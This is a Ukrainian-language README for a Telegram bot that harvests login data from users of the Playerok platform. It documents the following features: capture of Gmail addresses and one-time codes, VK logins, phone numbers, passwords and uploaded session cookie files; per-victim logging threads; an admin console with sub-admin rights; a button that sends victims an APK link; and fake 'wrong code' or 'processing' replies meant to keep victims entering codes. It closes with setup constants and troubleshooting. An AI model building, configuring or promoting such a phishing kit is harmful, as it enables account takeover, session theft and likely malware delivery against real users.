## 🧩 Про проєкт

**Playerok Bot** — це Telegram-бот, який дозволяє збирати дані авторизації користувачів платформи Playerok через зручний інтерфейс із кнопками. Бот підтримує два методи входу — через **Gmail** та **VK**, а також спеціальний **Cookie-режим** із завантаженням файлів.

Ключова особливість — **інтерактивна консоль адміністратора** прямо в Telegram: одне повідомлення, яке оновлюється в реальному часі та містить усі кнопки управління. Ніяких команд вручну — все через кнопки.

Бот використовує **подвійну базу даних**: SQLite для структурованих запитів та окремі TXT-файли для зручного людськочитаємого перегляду.

### 🖥️ Адмін-консоль

Адмін-консоль — це **одне повідомлення в Telegram**, яке живе постійно й оновлюється автоматично кожні **5 секунд**. Містить усю потрібну інформацію та кнопки управління.

**Головний екран консолі відображає:**

- 💬 Кількість активних тем
- 📧 Кількість зібраних Gmail аккаунтів
- 📱 Кількість VK аккаунтів
- ⚙️ Поточний стан усіх налаштувань

**Кнопки головного меню консолі:**

| Кнопка | Функція |
|--------|---------|
| 👥 Користувачі | База даних користувачів із пагінацією |
| 📊 Статистика | Детальна статистика зібраних даних |
| ⚡ Пінг | Статус з'єднання та uptime |
| ⚠️ Помилки | Журнал помилок за останні 24 години |
| 📢 Розсилка | Масова відправка повідомлення всім юзерам |
| ⚙️ Налаштування | Перемикачі всіх режимів роботи |
| 👤 Суб-адміни | Управління суб-адміністраторами |
| 📤 Експорт | Вивантаження всіх даних у `.txt` файл |
| 🔄 Оновити | Примусове оновлення консолі |

**Карточка користувача (при кліку):**
- Ім'я, username, Telegram ID

- Всі зібрані дані: email, коди, телефони, паролі, cookie
- Кнопка виходу Cookie-файлу (якщо є)

### 👥 Система суб-адміністраторів

Головний адмін може додавати суб-адмінів з гнучкими правами. Кожен суб-адмін прив'язаний до **конкретної групи** та отримує **власну консоль** із доступними йому функціями.

**Доступні права суб-адміна:**

| Право | Опис |
|-------|------|
| `users` | 👥 Перегляд бази користувачів |
| `stats` | 📊 Перегляд статистики |
| `ping` | ⚡ Перегляд пінгу / статусу |
| `errors` | ⚠️ Перегляд журналу помилок |
| `broadcast` | 📢 Здійснення розсилки |
| `settings` | ⚙️ Зміна налаштувань бота |

**Схема додавання суб-адміна (через консоль):**

```
Консоль → 👤 Суб-адміни → ➕ Додати
  ├── Введіть Telegram ID нового адміна
  ├── Введіть ID групи для консолі
  └── Оберіть права (кнопки-перемикачі)
        ✅ Підтвердити
```

**Зберігання прав:** JSON-рядок у таблиці `sub_admins`:
```json
{"users": true, "stats": true, "ping": false, "errors": false, "broadcast": true, "settings": false}
```

Суб-адмін бачить лише ті кнопки в своїй консолі, на які у нього є права.

### 📋 Логування дій

Кожен новий користувач автоматично отримує **окрему тему** у груповому чаті (форум-група Telegram). Усі дії логуються в цю тему.

**Що надходить у тему кожного юзера:**

```
🆕 НОВИЙ КОРИСТУВАЧ
👤 Ім'я: Іван
📱 Username: @ivan123
🆔 ID: 123456789
⏰ Час: 17.06.2026 15:32:10
Статус: 🟢 АКТИВНИЙ

[💬 Відповісти] [🔴 Заблокувати] [📎 Посилання]
[✅ Успішний вхід] [❌ Не успішний]
```

```
📧 Gmail Email → ivan@gmail.com
🔢 Gmail Code  → 482910
```

**Кнопки в темі:**

| Кнопка | Дія |
|--------|-----|
| 💬 Відповісти | Надіслати повідомлення цьому юзеру від бота |
| 🔴 Заблокувати | Заблокувати юзера (більше не зможе використовувати бота) |
| 🟢 Розблокувати | Зняти блокування |
| 📎 Посилання | Надіслати APK-посилання юзеру |
| ✅ Успішний вхід | Позначити вхід як успішний + сповістити юзера |
| ❌ Не успішний | Позначити вхід як невдалий |

### 🍪 Cookie-режим

Окремий режим для збору Cookie-файлів авторизації.

- Вмикається/вимикається через консоль (⚙️ Налаштування → 🍪 Cookie)
- При увімкненому режимі — в головному меню юзера з'являється кнопка завантаження
- Юзер надсилає `.txt` файл з cookies
- Файл зберігається в SQLite як BLOB + запис в TXT-базу
- Адмін може виходити файл прямо з карточки юзера у консолі (кнопка 📥 Виходити Cookie)
- Cookie-файл пересилається адміну у вигляді документа

Масова розсилка повідомлення всім зареєстрованим користувачам.

2. Консоль переходить в режим очікування

## ⚙️ Налаштування

Перед запуском відредагуй константи в коді (на початку файлу):

```python
# ───── ОБОВ'ЯЗКОВІ ─────
BOT_TOKEN = "1234567890:ABCdefGHIjklMNOpqrSTUvwxYZ"  # Токен від @BotFather
ADMIN_ID   = 123456789                                # Твій Telegram ID

# ───── ГРУПИ ─────
USER_ACTIONS_CHAT_ID = -1001234567890   # Форум-група для логів дій юзерів
CONSOLE_CHAT_ID      = -1009876543210   # Група/чат для адмін-консолі
```

> **Важливо:** `USER_ACTIONS_CHAT_ID` — це форум-група Telegram (з увімкненими темами), бо бот створює окрему тему для кожного юзера.

### Як отримати ID групи

1. Додай бота в групу
2. Зроби його адміністратором
3. Надішли в групу будь-яке повідомлення
4. Відкрий: `https://api.telegram.org/bot<TOKEN>/getUpdates`
5. Знайди `"chat": {"id": -1001234567890}` — це і є ID

## ⚙️ Режими роботи

Всі режими перемикаються через кнопки в консолі (⚙️ Налаштування) і зберігаються в `bot_settings` SQLite:

| Параметр | Ключ у БД | Значення | Дія |
|----------|-----------|----------|-----|
| Вхід через VK | `vk_mode` | `true/false` | Показує/ховає кнопку ВК у меню юзера |
| Cookie-режим | `cookie_mode` | `true/false` | Показує/ховає кнопку Cookie у меню юзера |
| Підтримка | `support_enabled` | `true/false` | Вмикає/вимикає розділ підтримки |
| Режим відповіді | `response_mode` | `error/processing` | Що показати юзеру після введення даних |
| Тех. роботи | `maintenance_mode` | `true/false` | Блокує всі дії юзерів |

**Режим відповіді:**
- `🔴 Помилка` → юзер бачить: *"Не вірний код/пароль. ❌"*
- `🟢 Обробка` → юзер бачить: *"🟢 Обробка... Будь ласка, зачекайте!"*

## 🧵 Система тем (threads)

Бот автоматично створює **форумні теми** у групі `USER_ACTIONS_CHAT_ID`:

1. Юзер запускає `/start` → бот шукає тему для нього у кеші
2. Якщо теми немає → створює нову тему (назва: `👤 Ім'я | @username`)
3. ID теми зберігається в SQLite (`threads`) та кеші в оперативній пам'яті
4. Всі логи юзера (карточка, email, коди, телефони) надсилаються в його тему
5. При видаленні теми в Telegram → бот автоматично створить нову

**Кеш тем** (`user_threads_cache`) завантажується з БД при старті та оновлюється в реальному часі.

## 🔐 Безпека

- **Lock-файл** — запобігає запуску двох екземплярів бота одночасно
- **Перевірка ADMIN_ID** — всі дії консолі перевіряються перед виконанням
- **Права суб-адмінів** — кожна дія суб-адміна перевіряє його конкретне право
- **Заблоковані юзери** — перевірка блокування відбувається при кожному повідомленні
- **Фільтр груп** — бот ігнорує повідомлення від групових чатів (тільки приватні)
- **Валідація даних** — email перевіряється регулярним виразом, телефон — форматом

## 🛠 Усунення неполадок

### ❌ "Бот вже запущений!"
```bash
rm ~/playerok_bot.lock
python beta.py
```

### ❌ "Тема не знайдена для користувача"
Переконайся, що:
- `USER_ACTIONS_CHAT_ID` вказаний правильно
- Група є **форум-групою** (Topics увімкнені в налаштуваннях групи)
- Бот є **адміністратором** групи з правом управляти темами

### ❌ Консоль не відображається
- Перевір `CONSOLE_CHAT_ID`
- Бот має бути в цьому чаті/групі
- Переконайся, що токен вірний

### ⚠️ Помилки мережі при роботі
